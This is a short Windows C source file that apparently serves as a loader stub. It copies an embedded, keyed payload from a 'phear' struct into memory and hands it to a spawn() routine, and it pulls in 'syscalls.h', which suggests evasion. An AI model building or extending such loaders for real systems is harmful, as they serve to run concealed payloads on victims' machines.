

#include <windows.h>
#include <stdio.h>
#include "patch.h"

#include "syscalls.h"

void main(HINSTANCE mhandle) {
	
	phear * payload = (phear *)data;
	char * buffer;
	buffer = (char *)malloc(payload->length);
	memcpy(buffer, payload->payload, payload->length);

	spawn(buffer, payload->length, payload->key);

	free(buffer);
}
